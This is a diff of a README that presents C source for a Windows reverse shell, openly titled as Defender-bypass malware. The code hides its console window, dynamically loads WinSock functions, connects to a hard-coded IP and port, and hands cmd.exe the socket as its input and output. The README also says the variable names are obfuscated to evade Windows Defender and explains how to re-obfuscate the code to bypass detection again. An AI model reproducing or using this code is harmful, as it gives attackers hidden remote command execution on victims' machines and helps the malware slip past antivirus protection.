@@ -1,4 +1,4 @@
-# WINDOWS DEFENDER Bypass Malware
+# Windows Defender Bypass Malware
 
 This program demonstrates how to establish a remote connection to a server using the WinSock2 library and execute a command prompt (`cmd.exe`) on a Windows system. The code dynamically loads functions from `ws2_32.dll` and uses these functions to perform network operations.
 
@@ -24,7 +24,7 @@ This program demonstrates how to establish a remote connection to a server using
 #pragma comment(lib, "user32.lib")
 These headers provide the necessary functions and definitions for Windows API, network operations, and standard I/O operations.
 
-#### Typedef Function Pointers
+//Typedef Function Pointers
 
 typedef int (WSAAPI *lpfnWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);
 typedef int (WSAAPI *lpfnWSACleanup)(void);
@@ -34,7 +34,7 @@ typedef int (WSAAPI *lpfnRecv)(SOCKET s, char *buf, int len, int flags);
 
 These typedefs declare pointers to the functions we will dynamically load from ws2_32.dll.
 
-#### Main Function
+//Main Function
 int main(int argc, char* argv[]) {
     FreeConsole();  // Hide the console window
 
@@ -43,7 +43,7 @@ int main(int argc, char* argv[]) {
         printf("Could not load ws2_32.dll\n");
         return 1;
     }
-#### Get Function Address
+// Get Function Address
     lpfnWSAStartup uywueftuwefwuuw = (lpfnWSAStartup)GetProcAddress(hwww, "WSAStartup");
     lpfnWSACleanup ploskdmcnc = (lpfnWSACleanup)GetProcAddress(hwww, "WSACleanup");
     lpfnWSASocket yncsj = (lpfnWSASocket)GetProcAddress(hwww, "WSASocketW");
@@ -55,18 +55,18 @@ int main(int argc, char* argv[]) {
         FreeLibrary(hwww);
         return 1;
     }
-#### Initialize WinSock and Create a Socket
+// Initialize WinSock and Create a Socket
 WSADATA ietuwecwtuecwucuwaa;
     uywueftuwefwuuw(MAKEWORD(2, 2), &ietuwecwtuecwucuwaa);  // Initialize WinSock
     SOCKET qqweretrwqcqqmmn = yncsj(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);  // Create a TCP socket
 
-#### Configure Server Address
+// Configure Server Address
     struct sockaddr_in Inksjshsfww;
     Inksjshsfww.sin_port = htons(1337);  // Port number
     Inksjshsfww.sin_family = AF_INET;
     Inksjshsfww.sin_addr.s_addr = inet_addr("192.168.1.1");  // Server IP address
 
-#### Connect to Server
+// Connect to Server
     int lthnbvmdl = llllosksuua(qqweretrwqcqqmmn, (SOCKADDR*)&Inksjshsfww, sizeof(Inksjshsfww), NULL, NULL, NULL, NULL);
     if (lthnbvmdl == SOCKET_ERROR) {
         printf("Connection Error to the server: %lu\n", WSAGetLastError());
@@ -74,7 +74,7 @@ WSADATA ietuwecwtuecwucuwaa;
         FreeLibrary(hwww);
         return 1;
     }
-#### Receive Data and STARTUPINFO
+// Receive Data and STARTUPINFO
     char awqszxa[4096];
     ujvjcmvcmvcmmcjyhn(qqweretrwqcqqmmn, awqszxa, sizeof(awqszxa), 0);  // Receive data
 
@@ -86,7 +86,7 @@ WSADATA ietuwecwtuecwucuwaa;
     siosusg.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
     siosusg.hStdInput = siosusg.hStdOutput = siosusg.hStdError = (HANDLE)qqweretrwqcqqmmn;
 
-#### Construct Command String and Create Process
+// Construct Command String and Create Process
     char b[3] = "cm";
     char c[4] = "d.e";
     char d[2] = "x";
@@ -110,14 +110,15 @@ WSADATA ietuwecwtuecwucuwaa;
     CloseHandle(iloksj.hThread);
     CloseHandle(iloksj.hProcess);
 
-#### Cleanup and Exit
+// Cleanup and Exit
     memset(awqszxa, 0, sizeof(awqszxa));
     ploskdmcnc();
     FreeLibrary(hwww);
     return 0;
 }
-Obfuscation Note
+## Obfuscation Note
+
 The variable names and certain parts of the code are obfuscated to evade static analysis detection by Windows Defender. If you want to bypass detection again, please change the file signature and obfuscate the code in different ways, as Windows Defender can capture static patterns.
 
-Summary
+## Summary
 This program demonstrates how to dynamically load network-related functions from ws2_32.dll, create a TCP socket, connect to a remote server, and execute a command prompt using the Windows API. It is an example of low-level network programming and process management in C on a Windows platform. Use this knowledge responsibly and ethically.
